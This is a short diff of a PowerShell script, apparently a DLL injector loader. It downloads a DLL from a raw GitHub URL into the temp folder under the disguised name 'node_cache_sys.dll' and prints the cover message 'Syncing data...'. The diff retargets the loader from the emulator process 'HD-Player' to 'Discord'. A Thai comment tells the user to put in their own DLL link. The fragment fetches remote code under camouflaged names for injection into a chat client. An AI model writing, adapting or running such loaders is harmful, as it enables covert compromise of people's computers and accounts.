@@ -53,7 +53,7 @@ if (Show-Auth) {
     # อย่าลืมแก้ลิงก์ DLL ให้เป็นชื่อจริงของคุณ (ใช้ %20 แทนเว้นวรรค)
     $dllUrl = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/refs/heads/main/RELAx%20DLL.dll"
     $tempPath = "$env:TEMP\node_cache_sys.dll"
-    $targetProc = "HD-Player"
+    $targetProc = "Discord"
 
     Write-Host "[*] Syncing data..." -ForegroundColor Yellow
     Invoke-WebRequest -Uri $dllUrl -OutFile $tempPath
